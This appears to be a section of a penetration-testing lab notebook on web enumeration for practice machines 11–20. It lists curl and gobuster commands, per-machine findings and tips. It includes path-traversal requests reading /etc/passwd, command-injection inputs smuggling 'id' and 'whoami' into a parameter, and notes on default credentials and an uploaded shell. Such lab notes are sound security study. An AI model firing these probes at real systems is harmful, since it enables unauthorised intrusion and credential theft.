## 🌐 Web Enumeration (Machines 11–20)

```bash
# Check for common web files and directories
curl -I http://<IP>/admin.php
curl -I http://<IP>/config.php
curl -I http://<IP>/.git/
curl -I http://<IP>/uploads

# Gobuster/Dirbuster
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
dirbuster -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Identify CMS or technologies
whatweb http://<IP>
wappalyzer http://<IP>

# Check for exposed login panels or services
curl -I http://<IP>/wp-login.php
curl -I http://<IP>/phpmyadmin/
curl -I http://<IP>:8080/

# Test for Local File Inclusion (LFI)
curl http://<IP>/?page=../../../../etc/passwd
curl http://<IP>/index.php?file=../../../../etc/passwd

# Test for Command Injection
curl http://<IP>/?input=test;id
curl http://<IP>/?input=test|whoami
```

---

### 📋 Observations (Machines 11–20)

- **Machine 11**: `/admin/` login portal with LFI (`?page=../../etc/passwd`) and basic auth.
- **Machine 12**: `.git` directory was exposed — pulled repo history for sensitive files.
- **Machine 13**: `/uploads` folder allowed file browsing. Shell uploaded and triggered.
- **Machine 14**: `/config.php` revealed database credentials.
- **Machine 15**: PHP site vulnerable to command injection via `?input=ls`.
- **Machine 16**: `/phpmyadmin/` exposed, default creds tried (`root:root`).
- **Machine 17**: `wp-login.php` led to user enumeration using `wpscan`.
- **Machine 18**: Directory listing enabled — found `backup.tar.gz` with sensitive data.
- **Machine 19**: Admin panel login at `/admin.php`, SQL injection vulnerability detected.
- **Machine 20**: `/server-status` enabled, leaked Apache info + uptime/version.

---

### 🧠 Tips

- Always test both GET and POST parameters for LFI/RFI/Command Injection.
- Use recursive directory fuzzing when encountering `index.php?page=` or similar patterns.
- `.git`, `.svn`, `.env`, and `.DS_Store` often leak sensitive info.
